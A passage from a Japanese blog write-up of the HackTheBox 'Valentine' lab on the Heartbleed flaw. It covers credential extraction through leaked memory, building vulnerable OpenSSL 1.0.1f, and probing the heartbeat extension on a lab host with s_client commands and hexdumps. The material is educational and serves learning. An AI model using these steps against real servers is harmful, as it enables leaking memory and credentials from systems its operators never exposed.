00</code>なので、サーバ側はこのハートビート要求が1KBであると誤認します。</p>\n<p>そして、応答を受け取るhit_hb関数ですが、これは特別なことはしていません。\n応答パケットのレコードヘッダから、正常にハートビート応答が返ってきたことが確認された場合にのみ、パケットをhexdump形式で出力しています。</p>\n<p>これで、Heartbleedの悪用によって、サーバ側の情報を抜き出すことに成功し、マシンの認証情報を抜き出すことができました！</p>\n<h2 id=\"おまけ脆弱なopensslをビルドする\" style=\"position:relative;\"><a href=\"#%E3%81%8A%E3%81%BE%E3%81%91%E8%84%86%E5%BC%B1%E3%81%AAopenssl%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B\" aria-label=\"おまけ脆弱なopensslをビルドする permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>おまけ：脆弱なOpenSSLをビルドする</h2>\n<p>ValentineはRetiredマシンなので、プレイするにはHackTheBoxの有料会員（月額1000円くらい）に登録する必要があります。</p>\n<p>ここでは、有料会員には登録したくないけどHeartbleedの検証は自分でやってみたいという方向けに、脆弱性のあるバージョンのOpenSSLを取得する方法についてまとめます。</p>\n<p>脆弱なバージョンのOpenSSLを取得するためには、古いバージョンのOSやDockerイメージを利用する方法や、古いバージョンのOpenSSLを直接ビルドする方法などがあると思います。</p>\n<p>今回は、古いバージョンのOpenSSLを直接ビルドする方法について紹介します。</p>\n<p>大まか流れとしては以下の通りです。</p>\n<ol>\n<li>安全な環境を用意する（僕は適当なDockerコンテナを使いました）</li>\n<li>OpenSSLのリポジトリをcloneしてくる</li>\n<li>OpenSSL<em>1</em>0_1fのタグでブランチを切る</li>\n<li>ビルドする</li>\n</ol>\n<p>とりあえず、適当に構築したDockerコンテナのtmpディレクトリにOpenSSLのリポジトリをcloneして、脆弱なバージョンのブランチに切り替えておきます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> clone https://github.com/openssl/openssl\n<span class=\"token builtin class-name\">cd</span> openssl\n<span class=\"token function\">git</span> checkout -b tag refs/tags/OpenSSL_1_0_1f</code></pre></div>\n<p>次にOpenSSLをビルドします。\nこの際、僕の環境ではmanページのインストールに問題があったため、<code class=\"language-text\">make install_sw</code>でmanページのインストールを省略しました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">./config --openssldir<span class=\"token operator\">=</span>/tmp\n<span class=\"token function\">make</span>\n<span class=\"token function\">make</span> install_sw</code></pre></div>\n<p>ビルドが完了すると、appディレクトリにプログラムが配置されます。\nバージョンを確認すると、<code class=\"language-text\">OpenSSL 1.0.1f</code>が想定通りビルドされていることがわかります。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">root@3d6a898953b4:/tmp/openssl/apps<span class=\"token comment\"># ./openssl version</span>\nOpenSSL <span class=\"token number\">1.0</span>.1f <span class=\"token number\">6</span> Jan <span class=\"token number\">2014</span></code></pre></div>\n<p>これで、ローカルな環境でもHeartbleedのテストができるようになります。</p>\n<p>また、環境によっては、<code class=\"language-text\">error while loading shared libraries: libssl.so.3</code>というエラーでうまく実行できないかもしれません。</p>\n<p>その場合は、次のコマンドで解消します。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">ln</span> -s libssl.so.3 libssl.so\nldconfig</code></pre></div>\n<h2 id=\"おまけheartbeatリクエストとレスポンスを確認する\" style=\"position:relative;\"><a href=\"#%E3%81%8A%E3%81%BE%E3%81%91heartbeat%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%81%A8%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\" aria-label=\"おまけheartbeatリクエストとレスポンスを確認する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>おまけ：Heartbeatリクエストとレスポンスを確認する</h2>\n<p>Heartbeat機能が存在する古いOpenSSLの<code class=\"language-text\">-tlsextdebug</code>を使用することで、被攻撃サーバがHeartbleedの脆弱性を持っているか確認することができます。</p>\n<p>以下は、そのコマンドと出力例です。\n<code class=\"language-text\">TLS server extension \"heartbeat\" (id=15), len=1</code>の行から、heartbeat拡張が稼働していることが分かります。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">./openssl s_client -connect <span class=\"token number\">10.10</span>.10.79:443 -tlsextdebug\n\nCONNECTED<span class=\"token punctuation\">(</span>00000003<span class=\"token punctuation\">)</span>\nTLS server extension <span class=\"token string\">\"renegotiation info\"</span> <span class=\"token punctuation\">(</span>id<span class=\"token operator\">=</span><span class=\"token number\">65281</span><span class=\"token punctuation\">)</span>, <span class=\"token assign-left variable\">len</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n0001 - <span class=\"token operator\">&lt;</span>SPACES/NULS<span class=\"token operator\">></span>\nTLS server extension <span class=\"token string\">\"EC point formats\"</span> <span class=\"token punctuation\">(</span>id<span class=\"token operator\">=</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>, <span class=\"token assign-left variable\">len</span><span class=\"token operator\">=</span><span class=\"token number\">4</span>\n0000 - 03 00 01 02                                       <span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>\nTLS server extension <span class=\"token string\">\"session ticket\"</span> <span class=\"token punctuation\">(</span>id<span class=\"token operator\">=</span><span class=\"token number\">35</span><span class=\"token punctuation\">)</span>, <span class=\"token assign-left variable\">len</span><span class=\"token operator\">=</span><span class=\"token number\">0</span>\nTLS server extension <span class=\"token string\">\"heartbeat\"</span> <span class=\"token punctuation\">(</span>id<span class=\"token operator\">=</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span>, <span class=\"token assign-left variable\">len</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n0000 - 01                                                <span class=\"token builtin class-name\">.</span>\n<span class=\"token assign-left variable\">depth</span><span class=\"token operator\">=</span><span class=\"token number\">0</span> C <span class=\"token operator\">=</span> US, ST <span class=\"token operator\">=</span> FL, O <span class=\"token operator\">=</span> valentine.htb, CN <span class=\"token operator\">=</span> valentine.htb\nverify error:num<span class=\"token operator\">=</span><span class=\"token number\">18</span>:self signed certificate\nverify return:1\n<span class=\"token assign-left variable\">depth</span><span class=\"token operator\">=</span><span class=\"token number\">0</span> C <span class=\"token operator\">=</span> US, ST <span class=\"token operator\">=</span> FL, O <span class=\"token operator\">=</span> valentine.htb, CN <span class=\"token operator\">=</span> valentine.htb\nverify error:num<span class=\"token operator\">=</span><span class=\"token number\">10</span>:certificate has expired\n<span class=\"token assign-left variable\">notAfter</span><span class=\"token operator\">=</span>Feb  <span class=\"token number\">6</span> 00:45:25 <span class=\"token number\">2019</span> GMT\nverify return:1\n<span class=\"token assign-left variable\">depth</span><span class=\"token operator\">=</span><span class=\"token number\">0</span> C <span class=\"token operator\">=</span> US, ST <span class=\"token operator\">=</span> FL, O <span class=\"token operator\">=</span> valentine.htb, CN <span class=\"token operator\">=</span> valentine.htb\n<span class=\"token assign-left variable\">notAfter</span><span class=\"token operator\">=</span>Feb  <span class=\"token number\">6</span> 00:45:25 <span class=\"token number\">2019</span> GMT\nverify return:1\n---</code></pre></div>\n<p>また、<code class=\"language-text\">-msg</code>を付加することで、OpenSSLからHeartbleed要求を送信し、レスポンスを確認することができます 。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">./openssl s_client -connect <span class=\"token number\">10.10</span>.10.79:443 -tlsextdebug -msg\n\n---\nB\nHEARTBEATING\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> TLS <span class=\"token number\">1.2</span>  <span class=\"token punctuation\">[</span>length 0025<span class=\"token punctuation\">]</span>, HeartbeatRequest\n    01 00 <span class=\"token number\">12</span> 00 00 <span class=\"token number\">87</span> <span class=\"token number\">59</span> <span class=\"token builtin class-name\">cd</span> ed cf e6 <span class=\"token number\">27</span> <span class=\"token number\">84</span> 05 2c 2c\n    <span class=\"token number\">47</span> 5a <span class=\"token number\">51</span> 7f d9 e5 <span class=\"token number\">51</span> a8 <span class=\"token number\">47</span> f7 01 <span class=\"token number\">24</span> <span class=\"token number\">35</span> <span class=\"token number\">54</span> f1 3d\n    b6 <span class=\"token number\">25</span> bf <span class=\"token number\">64</span> cb\n<span class=\"token operator\">&lt;&lt;&lt;</span> TLS <span class=\"token number\">1.2</span>  <span class=\"token punctuation\">[</span>length 0025<span class=\"token punctuation\">]</span>, HeartbeatResponse\n    02 00 <span class=\"token number\">12</span> 00 00 <span class=\"token number\">87</span> <span class=\"token number\">59</span> <span class=\"token builtin class-name\">cd</span> ed cf e6 <span class=\"token number\">27</span> <span class=\"token number\">84</span> 05 2c 2c\n    <span class=\"token number\">47</span> 5a <span class=\"token number\">51</span> 7f d9 <span class=\"token number\">67</span> e6 <span class=\"token number\">79</span> <span class=\"token number\">58</span> b7 b9 <span class=\"token number\">46</span> f0 <span class=\"token number\">82</span> b6 <span class=\"token number\">76</span>\n    a5 cb <span class=\"token number\">75</span> d1 1a\n<span class=\"token builtin class-name\">read</span> R BLOCK</code></pre></div>\n<p>上記のように、<code class=\"language-text\">01</code>で始まる<code class=\"language-text\">00 12</code>バイトのデータを送信し、サーバから<code class=\"language-text\">02</code>で始まる、全く同じデータを持つハートビート応答を受け取っていることがわかります 。</p>\n<h2 id=\"まとめ\" style=\"position:relative;\"><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"まとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>まとめ</h2>\n<p>HackTheBoxで初めて解いたマシン、Valentineより、Heartbleedの脆弱性について深堀してみました。</p>\n<p>何も理解できないまま、何となく既存のエクスプロイトコードを実行して解いてしまったのがずっと心残りだったので、今回学びなおすことができてよかったです。</p>\n<p>OpenSSLのソースコードを初めて読んだり、SSLコネクションの詳細について腰を据えて学びなおすことができたので非常に勉強になりました。</p>\n<p>今後もテーマを決めて解説記事を書くようなことは続けていけたらと思います。</p>\n<h2 id=\"参考情報\" style=\"position:relative;\"><a href=\"#%E5%8F%82%E8%80%83%E6%83%85%E5%A0%B1\" aria-label=\"参考情報 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>参考情報</h2>\n<h3 id=\"book\" style=\"position:relative;\"><a href=\"#book\" aria-label=\"book permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BOOK</h3>\n<ul>\n<li><a href=\"https://amzn.to/3fGQ9h0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">プロフェッショナルSSL/TLS</a></li>\n<li><a href=\"https://amzn.to/3du5b7h\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">マスタリングTCP/IP　入門編（第6版）</a></li>\n</ul>\n<h3 id=\"web\" style=\"position:relative;\"><a href=\"#web\" aria-label=\"web permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WEB</h3>\n<ul>\n<li><a href=\"https://xtech.nikkei.com/it/atcl/column/16/041400084/041400003/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">図解でわかるHeartBleed | 日経クロステック（xTECH）</a></li>\n<li><a href=\"https://www.tiger1997.jp/report/activity/securityreport_20140410.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenSSLのHeartbleed脆弱性(CVE-2014-0160)</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/32745\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenSSL TLS Heartbeat Extension - ‘Heartbleed’ Memory Disclosure - Multiple remote Exploit</a></li>\n<li><a href=\"https://www.ipa.go.jp/security/ciadr/vul/20140408-openssl.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">更新：OpenSSL の脆弱性対策について(CVE-2014-0160)：IPA 独立行政法人 情報処理推進機構</a></li>\n<li><a href=\"https://github.com/openssl/openssl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">openssl/openssl: TLS/SSL and crypto library</a></li>\n<li><a href=\"https://qiita.com/yukitsukai47/items/e59407abd1e76fa48a24\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Hack The Box[Valentine] -Writeup- - Qiita</a></li>\n<li><a href=\"https://stackabuse.com/heartbleed-bug-explained/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Heartbleed Bug Explained</a></li>\n<li><a href=\"https://www.jpcert.or.jp/sc-rules/c-arr33-c.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ARR33-C. コピーは必ず十分なサイズの記憶領域に対して行われることを保証する</a></li>\n<li><a href=\"https://ota42y.com/blog/2014/11/08/size-t/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">size_tは環境によって定義が変わるという話 - おおたの物置</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/32764\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenSSL 1.0.1f TLS Heartbeat Extension - ‘Heartbleed’ Memory Disclosure (Multiple SSL/TLS Versions) - Multiple remote Exploit</a></li>\n<li><a href=\"https://www.cisco.com/c/en/us/support/docs/security-vpn/secure-socket-layer-ssl/116181-technote-product-00.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SSL Introduction with Sample Transaction and Packet Exchange - Cisco</a></li>\n<li><a href=\"https://qiita.com/n-i-e/items/41673fd16d7bd1189a29\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SSL/TLS（SSL3.0～TLS1.2）のハンドシェイクを復習する - Qiita</a></li>\n<li><a href=\"https://qiita.com/silverskyvicto/items/dca3d4b985829b4b5f1f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenSSL をソースからビルドする - Qiita</a></li>\n<li><a href=\"https://devblogs.microsoft.com/oldnewthing/20171113-00/?p=97386\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">On memory allocations larger than 64KB on 16-bit Windows | The Old New Thing</a></li>\n</ul>","fields":{"slug":"/hackthebox-linux-valentine","tagSlugs":["/tag/hack-the-box/","/tag/linux/","/tag/easy-box/"]},"frontmatter":{"date":"2021-10-04","description":"HackTheBoxのRetired Machine [valentine] を通して、Heartbleed 脆弱性について学びます。","tags":["HackTheBox","Linux","EasyBox"],"title":"HackTheBox「Valentine」で学ぶ Heartbleed 脆弱性","socialImage":{"publicURL":"/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"}}}},"pageContext":{"slug":"/hackthebox-linux-valentine"}},"staticQueryHashes":["251939775","401334301","825871152"]}